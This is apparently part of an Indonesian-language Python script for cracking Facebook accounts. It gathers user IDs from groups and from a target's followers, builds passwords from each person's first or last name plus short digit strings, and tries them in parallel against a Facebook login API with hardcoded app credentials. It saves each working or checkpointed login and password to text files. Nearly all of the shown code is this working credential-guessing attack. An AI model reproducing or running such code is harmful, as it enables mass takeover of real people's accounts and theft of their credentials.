	print("\n\033[1;95m(\033[1;92m~\033[1;95m) \033[1;96mGunakan \033[1;93mMode \033[1;92mPesawat Jika Tidak Ada Hasil")
	print ("\033[1;94m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
	
##### MAIN LIKES #####
	def main(arg):
		sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
		global cekpoint,oks
		zowe = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos1
				oke = open("done/grup.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
					print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
					print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
					print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos1
					cek = open("done/grup.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos2
						oke = open("done/grup.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
							print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
							print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
							print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos2
							cek = open("done/grup.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos3
								oke = open("done/grup.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
									print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
									print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
									print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos3
									cek = open("done/grup.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = j['last_name'].lower()+'123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos4
										oke = open("done/grup.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
											print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
											print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
											print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos4
											cek = open("done/grup.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = j['last_name'].lower()+'1234'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos5
												oke = open("done/grup.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
													print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
													print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
													print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos5
													cek = open("done/grup.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = j['last_name'].lower()+'12345'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos6
														oke = open("done/grup.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
															print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
															print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
															print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos6
															cek = open("done/grup.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;96m══════════════════════════════════════════════════"
	print '\033[1;97m[\033[1;91m+\033[1;97m] \033[1;97mSelesai ...'
	print"\033[1;97m[\033[1;91m+\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m[\033[1;91m+\033[1;97m] \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97mfile tersimpan \033[1;91m: \033[1;92mdone/grup.txt'
	print 50* "\033[1;94m═"
	raw_input("\033[1;97m{<\033[1;96mKembali\033[1;97m>}")
	menu()
	
##### CRACK FOLLOW #####
def crack_follow():
	toket=open('login.txt','r').read()
	os.system('clear')
	print logo
	print 50* "\033[1;91m═"
	print ("              \033[1;93m°°° \033[1;94mCRACK FOLLOWERS \033[1;95m°°°")
	print 50* "\033[1;92m═"
	idt = raw_input("\033[1;95m(\033[1;97m~\033[1;95m) \033[1;97mID Publik/Teman \033[1;91m:\033[1;94m ")
	try:
		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
		op = json.loads(jok.text)
		print"\033[1;95m(\033[1;97m~\033[1;95m) \033[1;97mNama \033[1;91m:\033[1;92m "+op["name"]
	except KeyError:
		print"\033[1;97m<\033[1;91m!\033[1;97m> ID publik/teman tidak ada !"
		raw_input("\n\033[1;95m[\033[1;97mKembali\033[1;95m]")
		menu()
	except requests.exceptions.ConnectionError:
		print"\033[1;95m<\033[1;97m!\033[1;95m> Tidak ada koneksi !"
		keluar()
	r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+toket)
	z = json.loads(r.text)
	for i in z['data']:
		id.append(i['id'])
		
	print "\033[1;95m(\033[1;97m~\033[1;95m) \033[1;97mTotal ID Followers \033[1;91m:\033[1;93m "+str(len(id))
	print('\033[1;95m(\033[1;97m~\033[1;95m) \033[1;97mStop Tekan \033[1;96mCTRL+Z')
	titik = ['\033[1;92m. ','\033[1;93m.. ','\033[1;96m... ','\033[1;95m.... ','\033[1;97m..... ']
	for o in titik:
		print("\r\033[1;95m(\033[1;97m~\033[1;95m) \033[1;97mCrack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print("\n\033[1;95m(\033[1;97m~\033[1;95m) \033[1;97mGunakan \033[1;90mMode \033[1;90mPesawat \033[1;97mJika Tidak Ada Hasil")
	print ("\033[1;96m══════════════════════════════════════════════════")
	
##### MAIN FOLLOW #####
	def main(arg):
		sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
		global cekpoint,oks
		zowe = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos1
				oke = open("done/follow.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
					print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
					print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
					print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos1
					cek = open("done/follow.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos2
						oke = open("done/follow.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
							print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
							print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
							print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos2
							cek = open("done/follow.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos3
								oke = open("done/follow.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
									print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
									print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
									print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos3
									cek = open("done/follow.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = j['last_name'].lower()+'123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos4
										oke = open("done/follow.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
											print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
											print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
											print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos4
											cek = open("done/follow.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = j['last_name'].lower()+'1234'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos5
												oke = open("done/follow.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
													print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
													print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
													print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos5
													cek = open("done/follow.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = j['last_name'].lower()+'12345'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos6
														oke = open("done/follow.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
															print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
															print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
															print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos6
															cek = open("done/follow.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;90m══════════════════════════════════════════════════"
	print '\033[1;95m(\033[1;97m~\033[1;95m) \033[1;97mSelesai ...'
	print"\033[1;95m(\033[1;97m~\033[1;95m) \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;95m(\033[1;97m~\033[1;95m) \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97mfile tersimpan \033[1;91m: \033[1;92mdone/follow.txt'
	print 50* "\033[1;97m═"
	raw_input("\033[1;97m[\033[1;95mKembali\033[1;97m]")
	menu()
	
##### USERNAME ID ####
def user_id():
	os.system('clear')
	print logo
	jalan ("\033[1;90mHallo Selamat Datang Di FIND ID FB")
	jalan ("\033[1;92mAlat Ini Bisa Mengubah Username Menjadi ID FB")
	jalan ("\033[1;93mTinggal Ketik Username FB Anda Atau Target")
	jalan ("\033[1;94mMaka Muncul ID FB Anda Atau Target Dibawah")
	print 50* "\033[1;91m═"
	ling = ('https://www.facebook.com/')
	url = ling+raw_input("\033[1;91m(\033[1;97m@\033[1;91m) Username : \033[1;97m")
	idre = re.compile('"entity_id":"([0-9]+)"')
	print 50* "\033[1;97m═"
	page = requests.get(url)
	print idre.findall(page.content)
	print 50* "\033[1;91m═"
	jalan ("\033[1;95mSalin Atau Copy ID FB Diatas Bila Perlu")
	jalan ("\033[1;96mTerima Kasih Sudah Mencoba")
	raw_input("\n\033[1;91m(\033[1;97mKembali\033[1;91m)")
	menu()
	
##### PERBARUI #####
def perbarui():
	os.system("clear")
	print logo
	print "\033[1;93m══════════════════════════════════════════════════"
	jalan ("\033[1;92mSedang Memperbarui Script \033[1;94m")
	jalan ("\033[1;92mTunggu Sebentar...")
	print "\033[1;93m══════════════════════════════════════════════════"
	os.system("git pull origin master")
	raw_input("\n\033[1;94m{\033[1;97m<Kembali>\033[1;94m}")
	menu()
	
if __name__=='__main__':
	menu()
	masuk()